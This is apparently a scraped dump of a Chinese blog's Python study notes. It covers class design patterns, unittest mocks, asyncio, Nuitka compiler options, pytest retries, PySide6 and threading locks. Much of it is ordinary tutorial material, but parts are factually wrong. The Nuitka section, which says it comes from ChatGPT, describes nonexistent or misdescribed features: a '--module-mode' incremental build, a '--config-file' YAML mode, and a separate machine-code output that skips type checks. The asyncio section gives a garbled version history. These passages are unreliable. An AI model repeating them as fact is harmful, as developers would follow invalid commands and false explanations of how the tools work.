当实现代理模式时，还有些细节需要注意。首先，__getattr__() 实际是一个后备 方法，只有在属性不存在时才会调用。因此，如果代理类实例本身有这个属性的话，那 么不会触发这个方法的。另外，__setattr__() 和 __delattr__() 需要额外的魔法来 区分代理实例和被代理实例 _obj 的属性。一个通常的约定是只代理那些不以下划线 _ 开头的属性 (代理类只暴露被代理类的公共属性)。 还有一点需要注意的是，__getattr__() 对于大部分以双下划线 (__) 开始和结尾 的属性并不适用 在类中定义多个构造器 想实现一个类，除了使用 __init__() 方法外，还有其他方式可以初始化它 为了实现多个构造器，你需要使用到类方法: import time class Date: \"\"\" 方法一：使用类方法\"\"\" # Primary constructor def __init__(self, year, month, day): self.year = year self.month = month self.day = day # Alternate constructor @classmethod def today(cls): t = time.localtime() return cls(t.tm_year, t.tm_mon, t.tm_mday) 直接调用类方法即可: a = Date(2012, 12, 21) # Primary b = Date.today() # Alternate 创建不调用 init 方法的实例 想创建一个实例，但是希望绕过执行 __init__() 方法 可以通过 __new__() 方法创建一个未初始化的实例. 不调用 __init__() 方法来创建一个实例, 使用 setattr 设置值: >>> d = Date.__new__(Date) >>> d <__main__.Date object at 0x1006716d0> >>> d.year >>> setattr(d, 'year', 2023) 利用 Mixins 扩展类功能 有很多有用的方法，想使用它们来扩展其他类的功能。但是这些类并没有任何继 承的关系。因此你不能简单的将这些方法放入一个基类，然后被其他类继承。 定义使用了__slots__=(), 表示实例字典不存储信息: class SetOnceMappingMixin: ''' Only allow a key to be set once. ''' __slots__ = () def __setitem__(self, key, value): if key in self: raise KeyError(str(key) + ' already set') return super().__setitem__(key, value) 通常当你想自定义类的时候会碰上这些问题。可能是某个库提供了一些基础类，你 可以利用它们来构造你自己的类。 假设你想扩展映射对象，给它们添加日志、唯一性设置、类型检查等等功能。 实现状态对象或者状态机 想实现一个状态机或者是在不同状态下执行操作的对象，但是又不想在代码中 出现太多的条件判断语句。 一个更好的办法是为每个状态定义一个对象: class Connection1: \"\"\" 新方案——对每个状态定义一个类\"\"\" def __init__(self): self.new_state(ClosedConnectionState) def new_state(self, newstate): self._state = newstate # Delegate to the state class def read(self): return self._state.read(self) def write(self, data): return self._state.write(self, data) 如果代码中出现太多的条件判断语句的话，代码就会变得难以维护和阅读。这里的 解决方案是将每个状态抽取出来定义成一个类。 这里看上去有点奇怪，每个状态对象都只有静态方法，并没有存储任何的实例 属性数据。实际上，所有状态信息都只存储在 Connection 实例中。在基类中定义的 NotImplementedError 是为了确保子类实现了相应的方法。 ps: 设计模式中有一种模式叫状态模式, 与此类似. 通过字符串调用对象方法 有一个字符串形式的方法名称，想通过它调用某个对象的对应方法。 最简单的情况，可以使用 getattr() 另外一种方法是使用 operator.methodcaller() 当你需要通过相同的参数多次调用某个方法时，使用 operator.methodcaller 就 很方便了。比如你需要排序一系列的点，就可以这样做: points = [ Point(1, 2), Point(3, 0), Point(10, -3), Point(-5, -7), Point(-1, 8), Point(3, 2) ] # Sort by distance from origin (0, 0) points.sort(key=operator.methodcaller('distance', 0, 0)) 调用一个方法实际上是两部独立操作，第一步是查找属性，第二步是函数调用。因 此，为了调用某个方法，你可以首先通过 getattr() 来查找到这个属性，然后再去以 函数方式调用它即可。 operator.methodcaller() 创建一个可调用对象，并同时提供所有必要参数，然 后调用的时候只需要将实例对象传递给它即可 实现访问者模式 你要处理由大量不同类型的对象组成的复杂数据结构，每一个对象都需要需要进 行不同的处理。比如，遍历一个树形结构，然后根据每个节点的相应状态执行不同的操 作。 这里遇到的问题在编程领域中是很普遍的，有时候会构建一个由大量不同对象组 成的数据结构。 使用访问者模式: class NodeVisitor: def visit(self, node): methname = 'visit_' + type(node).__name__ meth = getattr(self, methname, None) if meth is None: meth = self.gen return meth(node) class Evaluator(NodeVisitor): def visit_Number(self, node): return node.value def visit_Add(self, node): return self.visit(node.left) + self.visit(node.right) def visit_Sub(self, node): return self.visit(node.left) - self.visit(node.right) def visit_Mul(self, node): return self.visit(node.left) * self.visit(node.right) def visit_Div(self, node): return self.visit(node.left) / self.visit(node.right) def visit_Negate(self, node): return -node.operand 刚开始的时候你可能会写大量的 if/else 语句来实现，这里访问者模式的好处就是 通过 getattr() 来获取相应的方法 还有一点需要指出的是，这种技术也是实现其他语言中 switch 或 case 语句的方式。 比如，如果你正在写一个 HTTP 框架，你可能会写这样一个请求分发的控制器: class HTTPHandler: def handle(self, request): methname = 'do_' + request.request_method getattr(self, methname)(request) def do_GET(self, request): pass def do_POST(self, request): pass def do_HEAD(self, request): pass 不用递归实现访问者模式 访问者模式一个缺点就是它严重依赖递归，如果数据结构嵌套层次太深可能会有 问题，有时候会超过 Python 的递归深度限制 (参考 sys.getrecursionlimit() )。 你使用访问者模式遍历一个很深的嵌套树形数据结构，并且因为超过嵌套层级限 制而失败。你想消除递归，并同时保持访问者编程模式。 通过巧妙的使用生成器可以在树遍历或搜索算法中消除递归。 循环引用数据结构的内存管理 程序创建了很多循环引用数据结构 (比如树、图、观察者模式等)，你碰到了内存管理难题。 一个简单的循环引用数据结构例子就是一个树形结构，双亲节点有指针指向孩子 节点，孩子节点又返回来指向双亲节点。这种情况下，可以考虑使用 weakref 库中的 弱引用: import weakref class Node: def __init__(self, value): self.value = value self._parent = None self.children = [] def __repr__(self): return 'Node({!r:})'.format(self.value) # property that manages the parent as a weak-reference @property def parent(self): return None if self._parent is None else self._parent() @parent.setter def parent(self, node): self._parent = weakref.ref(node) def add_child(self, child): self.children.append(child) child.parent = self 这种是想方式允许 parent 静默终止。例如: >>> root = Node('parent') >>> c1 = Node('child') >>> root.add_child(c1) >>> print(c1.parent) Node('parent') >>> del root >>> print(c1.parent) None >>> 循环引用的数据结构在 Python 中是一个很棘手的问题，因为正常的垃圾回收机制 不能适用于这种情形。 Python 有另外的垃圾回收器来专门针对循环引用的，但是你永远不知道它什么时 候会触发。另外你还可以手动的触发它，但是代码看上去很挫: >>> import gc >>> gc.collect() # Force collection Data.__del__ Data.__del__ >>> 如果循环引用的对象自己还定义了自己的 __del__() 方法，那么会让情况变得更 糟糕。 弱引用消除了引用循环的这个问题，本质来讲，弱引用就是一个对象指针，它不会 增加它的引用计数。你可以通过 weakref 来创建弱引用 让类支持比较操作 想让某个类的实例支持标准的比较运算 (比如 >=,!=,<=,< 等)，但是又不想去 实现那一大丢的特殊方法。 Python 类对每个比较操作都需要实现一个特殊方法来支持。例如为了支持 >= 操 作符，你需要定义一个 __ge__() 方法。尽管定义一个方法没什么问题，但如果要你实 现所有可能的比较方法那就有点烦人了。 装饰器 functools.total_ordering 就是用来简化这个处理的。使用它来装饰一个 来，你只需定义一个 __eq__() 方法，外加其他方法 (__lt__, __le__, __gt__, or __ge__) 中的一个即可。然后装饰器会自动为你填充其它比较方法。 创建缓存实例 在创建一个类的对象时，如果之前使用同样参数创建过这个对象，你想返回它的缓 存引用 要使用一个和类本身分开的工厂函数 虑重新定义类的 __new__() 方法, 不过有个问题是 __init__() 每次都会被调用，不管这个实例是否被缓存了 (一个解决办法是, 仅使用__new__来实例)","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-cookbook-Class-and-object.html","loc":"/yq-doc-source-docs-rear-end-python-cookbook-Class-and-object.html"},{"title":"unittest","text":"mock 官网文档:: unittest.mock-上手指南 模拟方法调用, 比如测试的时候, 只想测试某一个类, 但是类有相关联的其他类, 那么可以使用 Mock() 来代替其他类. 记录一些坑 Can't pickle <class 'mock.Mock'> 报错: pickle.PicklingError: Can't pickle <class 'mock.Mock'>: it's not the same object as mock.Mock 类似这种 pickle 序列化报错, 大部分是在 /docs/后端/python/概念相关/多进程 下进行测试而出现的序列化问题 但是这里是 Mock 本身的问题, 使用以下方式解决: class PickableMock(Mock): def __reduce__(self): return (Mock, ()) 可参考解决地址:: Can't pickle MagicMock or Mock #139","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-Unittest.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-Unittest.html"},{"title":"asyncio","text":"官网: https://docs.python.org/zh-cn/3/library/asyncio.html 低层api索引: https://docs.python.org/zh-cn/3/library/asyncio-llapi-index.html 这部分属于协程, 相关介绍可见: /docs/后端/python/概念相关/协程 包问题 如果尝试用pip安装过, 会发现asyncio目前同时存在于Python标准库和三方包中, 这是因为: Python 3.4引入了asyncio模块,这是asyncio最初出现在Python标准库的形式。 在Python 3.5中,asyncio模块被重构,并更名为asyncio package。这是目前Python标准库中推荐使用的asyncio形式。 此外,还存在三方包asyncio和trolly,它们在Python 3.3之前实现了asyncio功能。 所以,目前asyncio主要有这三种形式: Python 3.4中的asyncio模块(已过时) Python 3.5+中的asyncio package(推荐) 三方包asyncio和trolly(仅用于Python 3.3之前) 应该关注并使用的是Python 3.5+中的asyncio package。它是官方支持和推荐的asyncio形式,具有更丰富的功能和更高的性能。 三方包asyncio和trolly由于兼容性问题,已经很少再被使用。而asyncio模块由于设计问题,已在Python 3.5中被更名和重构。 await和create_task的区别 await: 当前代码在此处挂起(阻塞), 等待await的语句执行完成. 程序中时间循环中的其他语句可以在这时候执行. 直到await的语句执行完成(如果一下就执行完了, 那么可以说没有等待) 但只能用在 async 方法体内 create_task: 创建一个任务, 提交给事件循环队列(上下文环境复制一份给事件循环), 事件循环自动调度, 不阻塞 同步异步方法内皆可用 可等待对象 可等待对象有 coroutine/future/task 其中task是future的子类 任务回调 task.add_done_callback 完成后的回调如何自定义参数, 使用 functools.partial 偏函数来插入参数， 此处正常情况的参数只有一个 future 对象表示它本身这个 task: # 插入参数后， 实际回调的参数列表为 (_num, task), 也就是 (10, task) task.add_done_callback(functools.partial(cls._set_num1, 10)) 多线程的事件循环 一般而言, 只能是主线程拥有自己的事件循环, 子线程无法获取主线程的loop, 若子线程需要, 可以在新建一个loop给子线程使用, 尤其是gui编程的时候, 一般gui线程只能在主线程跑(除非提供了特殊支持), 那么当存在全局的非gui能处理的实时监听时, 那么就只能在子线程跑了(或者新建一个进程, 至少目前我是没有其他办法) 事件循环增加信号监听 code: import signal loop.add_signal_handler(signal.SIGTERM, hander) 与socket协作 code: _sock: socket.socket loop.sock_recv(_sock, 1024) 并发执行(假并发) 使用 asyncio.gather 同时运行两个协程任务: tasks = [task1(), task2()] loop.run_until_complete(asyncio.gather(*tasks)) 创建socket-udp事件 使用 loop.create_datagram_endpoint eg: loop.create_datagram_endpoint( lambda: OrdinaryProtocol(), local_addr=('0.0.0.0', 0), ) 注意 protocol_factory 必须为一个返回 协议 实现的可调用对象, 协议 实现是指实现 asyncio.protocols 下的需要的协议, 协议的基类是 asyncio.protocols.BaseProtocol 如udp编程使用 协议 实现asyncio.protocols.DatagramProtocol 这里是 OrdinaryProtocol() 就是实现的 DatagramProtocol: class DatagramProtocol(DatagramProtocol): def __init__(self): self._transport: Optional[DatagramTransport] = None self._udp_socket: Optional[DatagramTransport] = None def connection_made(self, transport: transports.DatagramTransport) -> None: self._transport = transport def datagram_received(self, data: bytes, addr: tuple[str, int]) -> None: _LOGGER.debug(f'datagram_received:: addr: {addr} ; data: {data}') def connection_lost(self, exc: Optional[Exception]) -> None: ... async def close(self): self._transport.close() 判断是否是协程 可使用 asyncio 的 iscoroutinefunction: async def async_func(): ... asyncio.iscoroutinefunction(async_func) # True 或者inspect 的检查: inspect.iscoroutinefunction(async_func)) # True 如果要使用类型注解, 参见 CR_Callable","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-asyncio.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-asyncio.html"},{"title":"nuitka","text":"nuitka中文官网: https://nuitka.net/zh_CN/index.html Nuitka 是一个将 Python 代码编译成 C 或 C++ 代码的工具. 可以享受到python级别的开发速度，c级别的运行速度 Mac 下安装: pip install nuitka 额外建议安装orderedset， 这个是使用的时候建议安装, 原因: Nuitka:WARNING: Using very slow fallback for ordered sets, please install 'orderedset' PyPI package for best Python compile time performance: pip install orderedset 简单使用 当前系统版本安装的是python3版本的，所以于之前直接用 nuitka运行不一致，现在是nuitka3. 最简单的编译一个python文件: nuitka3 xxx.py Win使用的时候会提示安装 ccache来加速，根据提示输入安装就是了， 我的是在 ' https://nuitka.net/ccache/v4.2.1/ccache-4.2.1.zip ' 自动下载安装 执行成功后会在当前目录下生成相应的可执行文件和编译文件夹，xxx.bin（win下是exe文件）跟xxx.build， 命令选项 如: nuitka --standalone --show-progress --show-memory --plugin-enable=tk-inter --include-data-dir=resource=resource --onefile trigger-angle.py python -m nuitka --standalone --show-progress --show-memory --plugin-enable=pyqt5 --windows-icon-from-ico=res/icon.ico --include-data-dir=jsons=jsons --include-data-dir=pyqt=pyqt --include-data-dir=res=res --windows-disable-console --onefile .\\main_pyqt.py 常用 --module= <file> 指定主文件(入口文件), 比如main.py --standalone , -s 生成独立的可执行文件(包含所有依赖项, 使目标机器不需要自己安装Python即可运行) --onefile 是否打包为一个单独的 exe 文件(像pyinstaller一样)， 默认生成位置是在项目根目录下 --output-dir= <dir> , -o <dir> 输出目录, 生成exe到 dir文件夹 下面去 --plugin-enable= <plugin> 手动指定需要编译的三方包模块, 比如一些GUI模块tkinter, numpy, pytorch 如: --plugin-enable=tk-inter --include-files 指定文件包含到编译输出 --include-data-file= <source=target> 包含的文件夹, 会直接复制过去 source代表当前(编译前的源代码阶段)位置; target代码编译后放置的位置, 注意 = 不能甚省略. --show-memory 查看编译时内存占用 --show-progress 查看编译进度, 显示进度条 --remove-output , -x 删除编译后的文件. --python-flag= <FLAG> , -k <FLAG> 使用指定 Python 解释器编译. --show-scons 显示 Scons 命令及其参数，方便调试. --recurse-all , -r 递归处理所有导入过的模块 --show-modules , -m 显示要编译的所有模块 --experimental-annotations , -e a 启用实验性的类型注释功能. 即是否将Python代码中已有的 类型注解转换为C(++)的强类型定义. --no-pyi-file , -n p 不生成.pyi文件 --lto= <[yes,no]> 是否启用链接时优化（Link Time Optimization，LTO）. 它的作用是在链接可执行文件时，对整个程序进行全局优化，以达到更好的性能。 会增加额外的编译时间消耗. 启用后(yes)，nuitka 会在编译过程中生成 LLVM bitcode 文件，然后使用 LLVM 工具链进行链接。 LLVM 提供了一种跨平台的链接时优化技术，可以对各个模块之间的函数调用关系和数据依赖关系进行分析， 从而进行更加有效的优化。 --debug 启用编译后的可执行文件的运行时调试支持(也就是调试相关的符号表, 没有的话没法gdb调试) --python-debug 用于生成可以进行调试的编译后的二进制文件（或者.so/.dll库文件）。 它会保留源代码中的所有调试信息，包括行号、变量名称等 .. 可以在 Python 调试器中进行调试, 好像只能设置远程调试服务器, 待测试 包含/导入模块/包 --include-package= PACKAGE 显示指定需要包含的整个包. 默认为空. 复制比如numpy,PyQt5 这些带子文件夹的包 e.g. \"some_package.sub_package\". Python 将会寻找并包含到编译输出. 为了避免导入不需要的包, 可以使用, 如 \"--nofollow-import-to=*.tests\". --include-module= MODULE 包括单个模块。以一个Python命名空间给出， 复制比如when.py 这种以.py结尾的模块. 例如\"Some_Package.Some_Module\"，然后Nuitka将 找到它并将其包含在二进制或扩展中 模块，并使其可通过以下方式导入 密码。默认为空。 --include-plugin-directory= <MODULE/PACKAGE> 另外包含指定路径的下的包/模块. 此处找到的将会覆盖原来有的. 可指定多次. 默认为空. --include-plugin-files= PATTERN 包含文件内能匹配 PATTERN 的. 会覆盖原有的 . 可指定多次. 默认为空. --prefer-source-code 对于已经编译好的拓展模块, 不论是源文件还是拓展模块, 都正常使用. 会比直接从可用源文件编译要好?(这里没懂). 如果不希望，有--noprefer-source-code 来禁用有关它的警告。 默认 off. 控制跟踪导入的模块 什么叫跟踪导入? 见: CR_Python_跟踪导入 --follow-stdlib= <{yes,no}> 是否包含整个 Python 标准库, 会增加很多时间. 默认关闭. 值为 yes/no. --nofollow-imports 仅编译源代码，而不会尝试跟踪导入的任何模块/包. 使用此选项时, 若代码依赖于其他库或模块，则必须手动将它们包含在编译后的二进制文件中。 通常情况下，只有在确定所有依赖项都已正确安装并且您不需要将代码打包到独立的可执行文件中时， 才应使用此选项。 默认关闭. --follow-imports , -f 跟踪所有导入的模块/包，并将它们也编译为二进制文件. 若程序依赖于其他库或模块，则必须使用此选项以确保所有依赖项都被正确地编译到生成的可执行文件中。 这个选项可以确保你的程序能够完全独立运行，而不需要依赖于任何外部库或环境。 默认关闭. --follow-import-to= <MODULE/PACKAGE> 指定搜索模块时的搜索路径, 从当前路径开始, 详见: follow-import-to 可多次指定, 默认为空. --nofollow-import-to= <MODULE/PACKAGE> 不从路径导入. 可指定多个, 默认为空. 数据文件 这里的数据文件通常是指 必要的资源文件 , 如图片, 配置文件. --include-package-data= PACKAGE 包含指定 PACKAGE 下的所有数据文件. 支持通配符 By default Nuitka does not unless hard coded and vital for operation of a package. 文件应该是非 dll 文件, 非 拓展模块. 默认为空. --include-data-files= <DESC> 包含分布下指定描述的所有数据文件, 存在许多运行的格式, eg: --include-data-files=/path/to/file/*.txt=folder_name/some.txt , 将会复制为单个文件, 多文件将会有警告. --include-data-files=/path/to/files/*.txt=folder_name/ , 将会将所有匹配的文件复制到 folder_name 文件夹下. 若需要递归拷贝, 使用 --include-data-files=/path/to/scan=folder_name=**/*.txt 同时还会保留原有目录结构. 默认空. --include-data-dir= DIRECTORY 包含指定目录下的所有文件. 这是递归的. 若不需递归, 使用 --include-data-files. eg: '--include-data-dir=/path/some_dir=data/some_dir' 将会拷贝一个普通的全文件副本. 如果需要排除某些文件, 使用 --noinclude-data-files. 默认为空. --noinclude-data-files= PATTERN 不包含符合 PATTERN 匹配的文件. 仅针对文件名而非源路径. eg: package_name` 会匹配 package_name/*.txt . 默认空. DLL 文件 --noinclude-dlls= PATTERN 不包含复合匹配的 dll 文件. 需指定到具体目标文件, eg: \"package_name/someDLL.*\" 匹配 package_name 下包含 someDLL 的文件. 默认为空. 其他 举例: --noinclude-pytest-mode= error 如果包含pytest模块报错 --noinclude-unittest-mode= error 如果包含unittest模块报错, 防止意外导入不需要的包. --enable-plugin= <module> 直接添加你要的插件支持, 如--enable-plugin=pyqt5,numpy,matplotlib --plugin-list 不清楚该模块是否有特定的插件支持，在cmd窗口输入后查询 --mingw64 默认为已经安装的vs2017去编译， 否则就按指定的比如mingw(官方建议), 仅Win适用, 貌似 --windows-disable-console , -w dc 禁用Windows上的命令行窗口, 没有CMD控制窗口 --windows-icon-from-ico= <ico_p> 软件的图标, .ico图标文件 --windows-company-name= <com> Windows下软件公司name --windows-product-name= <product> Windows下软件名称 --windows-file-version= <file> Windows下软件的信息 --windows-product-version= <ver> 版本信息 --windows-file-description= <desc> Windows下软件的作用描述 --windows-uac-admin Windows下用户可以使用管理员权限来安装 --linux-onefile-icon= <file> Linux下的图标位置 YAML配置形式 支持使用 YAML 配置文件通过 --user-package-configuration-file 来指定配置, 如以下配置: # sample configuration file for Nuitka # 输出路径 output_dir: ./dist/ # 递归处理所有模块 recurse_all: true # 删除上一次的输出 remove_output: true # 生成独立的文件 standalone: true # 显示进度条 show_progress: true # 跟踪导入 follow_imports: true # python 版本 python_version: 3.9 启动: nuitka --config-file=config.yml myscript.py 注意，配置文件中的选项会覆盖命令行选项 关于 --nofollow-imports 说明 --nofollow-imports 是 Nuitka 编译器的一个选项，它的含义是在编译过程中不对某些导入语句进行处理。 具体来说，如果使用了 --nofollow-imports 选项，则 Nuitka 编译器会忽略某些导入语句， 并将它们视为运行时动态导入（Runtime Dynamic Imports），而不是静态导入。 通常情况下，Python 中的导入语句是静态的，也就是说，在执行 Python 脚本之前，所有必要的模块都已经被导入并加载到内存中了。 然而，在某些情况下，我们可能需要根据运行时条件来动态导入某些模块，这就需要使用运行时动态导入。 使用 --nofollow-imports 选项可以让 Nuitka 编译器在编译过程中忽略某些导入语句，从而减少编译时间和输出文件大小。 但是，这也可能会导致某些代码无法正常编译或运行，因此建议在使用该选项时谨慎考虑。 例如，假设我们有一个 Python 脚本 main.py，其中包含以下导入语句: import module1 from module2 import func if some_condition: import module3 else: import module4 如果使用默认选项（即不添加 --nofollow-imports）， 则 Nuitka 编译器会尝试静态地分析这些导入语句，并在编译过程中将所有必要的模块都包含在输出文件中。 如果使用 --nofollow-imports 选项，则 Nuitka 编译器会忽略其中一些导入语句，例如： nuitka --nofollow-imports main.py 由于该脚本中存在运行时条件导入语句，因此 Nuitka 编译器只能将它们视为运行时动态导入，而不是静态导入。 关于 --follow-import-to 说明 指示编译器在遵循 import 语句时应该搜索哪些路径。 这个标志允许你指定要跟踪的目录或文件名，使得 Nuitka 在编译过程中可以找到需要的依赖项。 例如，如果使用: --follow-import-to=dir1:dir2 则 Nuitka 将首先搜索当前目录、然后再搜索 dir1 和 dir2 目录，以查找所需的模块。 follow_imports 说明 指示编译器是否应该跟踪导入并包含它们。 如果设置为 true，则 nuitka 将跟踪所有导入的模块，并将其包含在生成的可执行文件中。 这通常用于确保所有依赖项都包括在二进制文件中，以便在运行时可以访问它们。 如果设置为 false，则 nuitka 不会在编译过程中跟踪导入，因此生成的二进制文件可能会缺少一些必要的依赖项。 默认情况下，该选项的值为 false。 你可以通过以下命令行选项来设置 follow_imports nuitka --follow-imports myscript.py 或者在 YAML 配置文件中使用: follow_imports: true 来启用该选项。 增量编译 技巧 来源于 ChatGpt Nuitka是一个Python编译器，它将Python源代码编译成C++代码，以获得更快的执行速度。 默认情况下，Nuitka会进行完整的构建，这意味着每次更改源代码时都需要重新编译整个程序。 然而，Nuitka支持增量编译，它只会重新编译发生更改的源文件，而不是整个程序。 这可以通过使用--module-mode参数来实现。例如，要对名为example.py的源文件进行增量编译，请使用以下命令: nuitka --module-mode example.py 这将生成一个名为example.so的共享库文件，其中包含编译后的代码。 如果您对example.py进行了更改，则只需要重新运行此命令即可仅重新编译更改的部分，而无需重新编译整个程序。 请注意，增量编译可能会导致一些问题，因为某些更改可能会影响其他源文件。 在这种情况下，您可能需要重新编译整个程序，以确保所有部分都是最新的。 进程调试 对于使用nuitka编译好的应用, 如何调试? 前提: 安装debug版的python , 参考 /docs/后端/python/教程/debug版本python安装 首先, 源码中导入\"ptvsd\"模块并添加\"ptvsd.enable_attach()\"语句。 这个语句会在程序启动时暂停,等待调试器附加: import ptvsd # Enable debugger ptvsd.enable_attach('my_secret_password') # Program code ... 其次, 使用 nuitka 编译时, 增加debug和python-debug参数: # /usr/local/python/python3.9.10/bin/python3.9 -m nuitka --python-debug main.py python -m nuitka --debug --python-debug myprogram.py 然后, 启动构建好的应用程序。程序启动后会暂停等待调试器连接。 在PyCharm中,选择\"Run\" -> \"Attach to Process...\", 然后在弹出窗口选择\"Python Attach\"并点击\"Connect to process on host\"选项。 在\"Gateway\"输入框中输入应用程序暂停时显示的\"ptvsd\"信息,包括密码。然后点击\"Attach\"。 PyCharm成功连接后,可以设置断点、查看变量、单步执行等进行调试。 完成调试后,点击\"Detach\"断开连接。程序将继续运行。 !! 经过多方测试, 不行, 只有使用gdb调..., mac下是lldb 特殊情况调试 普通情况下 进程调试 已经能满足需求, 但是有时, 是从源码编译安装的Python, 就会有些库找不到等问题. 对于此种情况, 做一个说明. 假设主程序my_program.py，需要使用静态链接的 Python 库 /opt/python/lib/libpython3.9.a 进行编译。 方案一: 可以先设置 NUITKA_PYTHON_LIB 环境变量: export NUITKA_PYTHON_LIB=/opt/python/lib/libpython3.9.a 然后使用 nuitka 命令进行编译: nuitka --standalone my_program.py 这将生成一个独立的可执行文件 my_program.bin，其中包含了静态链接的 Python 库。 方案二: 另一种方式是在 nuitka 命令中直接指定 Python 库的路径和名称: nuitka --standalone --python-flag=-L/opt/python/lib --python-flag=-lpython3.9 my_program.py 这将生成与上面相同的独立可执行文件。 注意，--python-flag=-L 选项指定 Python 库所在的目录，--python-flag=-l 选项指定 Python 库的名称。 注解 实际操作可能有不同, 我在ubuntu20上使用ubuntu16编译的python3.7, nuitka编译时指定--python-debug老是报错: libpython找不到或者当前python不支持: fatal: error, static libpython isnot found or not supported for this python installed 试过加环境变量, 加命令行选项都不行, 故此小节有待更新. 原理/底层部分说明 编译过程 Nuitka的编译过程分为三个步骤： 分析：对Python代码进行语法和语义分析，并生成内部表示。 优化：对内部表示进行各种优化，包括常量折叠、无用代码消除、函数内联、循环展开等。 生成代码：将优化后的内部表示转化为C或机器码，并生成可执行文件。 C代码生成 当选择将Python代码编译成C代码时，会生成一个.c和一个.h文件。 其中，.c文件包含了Python代码的C语言实现，.h文件包含了Python对象的定义、函数原型等信息。 这两个文件可以被编译成一个可执行文件。 需要注意的是，由于Python是一种动态语言，对象类型和大小在运行时才能确定。 因此，在生成C代码时，需要对每个对象进行类型检查，并根据类型分发到不同的实现中。 这导致了生成的C代码比较复杂，且不易阅读。 二进制代码生成 当选择将Python代码编译成机器码时，会生成一个可执行文件。 与C代码生成相比，机器码生成不需要进行类型检查，因为机器码已经包含了对象类型和大小的信息。 这使得生成的可执行文件比较小，且执行速度更快。 需要注意的是，由于机器码是与硬件平台相关的，因此生成的可执行文件只能在同一平台上运行。 性能优化 除了代码生成外，性能优化也是Nuitka的重要功能之一。 它通过各种编译技术和优化算法，对Python代码进行优化，从而提高程序的执行效率。 其中，最常用的优化算法包括： 常量折叠：将多次出现的常量合并成一个。 无用代码消除：删除不会被执行的代码。 函数内联：将函数调用替换成函数体。 循环展开：将循环拆分成多个重复代码块。 需要注意的是，在进行代码优化时，可能会改变原有的程序行为。因此，你需要仔细测试编译后的代码，确保其正确性和可靠性。 gcc相关环境变量 主要是使用nuitka生成c代码之后, 会用到gcc将代码编译成执行文件. 相关环境变量, gcc本身的环境变量此处不做说明, 可见 gcc_相关环境变量 nuitka支持的相关环境变量: NUITKA_CC: 使用gcc编译时, 使用相关参数/选项, 如 export NUITKA_CC=\"gcc -I/path/to/header/files -L/path/to/library/files -lexample\" , -I参数指定头文件路径，-L参数指定库文件路径，-lexample参数指定要链接的库文件名. 若同时指定了CC环境变量, NUITKA优先. NUITKA_EXTRA_CFLAGS: 指定额外的参数. NUITKA_EXTRA_CFLAGS: 指定链接器（如ld）的选项 报错找不到Python标准库文件 对于Python标准库的文件, 一般只要使用到, 编译的时候都是会自动导入, 但是有一种情况, 某些原因下可能没跟踪到所以不会导(比如你是在一个不会被跟踪的模块下导入), 这时候需要显示导入, 比如能跟踪到的地方写下导入语句, 比如bdb: import bdb 同时, 这种情况下是无法使用 --include-module=bdb 来处理的, 原因暂时未知.","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-nuitka.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-nuitka.html"},{"title":"pytest-rerunfailures","text":"支持使用 /docs/后端/python/教程/Pytest 时候的重试. 安装: pip3 install pytest-rerunfailures 使用: # --reruns 5 重试五次 # --reruns-delay 2 每次重试间隔2秒 pytest --reruns 5 --reruns-delay 2 -s 选项参数 --reruns= <int> 执行失败时重试次数 --reruns-delay= <int> 执行失败重试之间的间隔","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pytest-everunfailures.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pytest-everunfailures.html"},{"title":"GUI开发之QT","text":"前言 Qt是由C++开发的跨平台GUI框架, 针对Python有提供相应的Api 题主系统: MacOs 13 QT的Python相关框架 PyQt 第三方公司产品, 开源协议为GPL协议, 意味着使用此库, 所开发产品必须开源 PySide QT的亲子, 开源协议为LGPL协议, 使用此库, 开不开源皆自由 PySide2对应QT5; PySide6对应Qt6 两者提供接口基本一致 此处主要介绍用 PySide6 PySide6 安装PySide6 pip install pyside6 设计界面 QtWidget 当前最常用 QML 较新型, QT正在推广 此处主要使用 QtWidget 使用QtWidget开发 designer 图形化开发 命令行执行 pyside6-designer 启动 在 Mac 下启动如下所示 后续操作自己探索吧, 这界面没有 windows 版熟悉, 暂时不想研究 界面设计完成后可以保存为UI后缀文件, 使用 pyside6-uic $file.ui >ui.py 转换成py文件才可以使用 注解 生成的文件编码不是utf-8 手动编码 见 /docs/后端/python/python三方库/pyside6","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Tutorial-GUI-development-QT.html","loc":"/yq-doc-source-docs-rear-end-python-Tutorial-GUI-development-QT.html"},{"title":"多线程","text":"线程是进程的子任务，cpu调度和分配的基本单位，实现进程内并发。 启动一个新线程可使用 /docs/后端/python/python标准库/threading 模块 线程同步技术： 解决多个线程争抢同一个资源的情况，线程协作工作。一份数据同一时刻只能有一个线程处理。 解决线程同步的几种方法: Lock、RLock、Condition、Barrier、semaphore 线程间通信 互斥量 : 通过互斥机制防止多个线程同时访问公共资源。 信号量（Semphare）: 控制同一时刻多个线程访问同一个资源的线程数。 ps: python的threading 文档 事件（信号）: 通过通知的方式保持多个线程的同步。 互斥量 互斥锁(mutex)/互斥量 python Linux中提供一把互斥锁mutex（也称之为互斥量） 使用, threading模块中定义了Lock变量，这个变量本质上是一个函数，通过调用这个函数可以获取一把互斥锁: # 创建锁 mutex = threading.Lock() # 上锁 mutex.acquire() # 这里编写代码能保证同一时刻只能有一个线程去操作, 对共享数据进行锁定... # 释放锁 mutex.release() Python重互斥量的实现有以下几种形式 threading.Condition() : Condition对象提供了wait()、notify()和notify_all()等方法，可以用于控制多个线程的执行。在多个线程共享一个变量时，可以使用Condition对象来确保多个线程按照特定的顺序访问共享变量。 总体上包含了一个Lock对象和一个wait set。 该对象主要提供了以下三个方法: wait():释放内部锁并阻塞线程,将线程加入到wait set中。 notify():唤醒 wait set 中的一个线程。 notify_all():唤醒 wait set 中的所有线程。 notify()和notify_all()的区别在于: notify()只会唤醒wait set中的一个线程,并将其从wait set中移除。其余线程仍然阻塞。 notify_all()会唤醒wait set中的所有线程,并将它们全部从wait set中移除。 threading.Semaphore() : 计数信号量, 它允许多个线程同时访问共享资源，但需要限制同时访问该资源的线程数量。 Semaphore对象包含一个计数器，每当一个线程访问共享资源时，该计数器就会减1。当计数器为0时，其它线程将被阻塞。 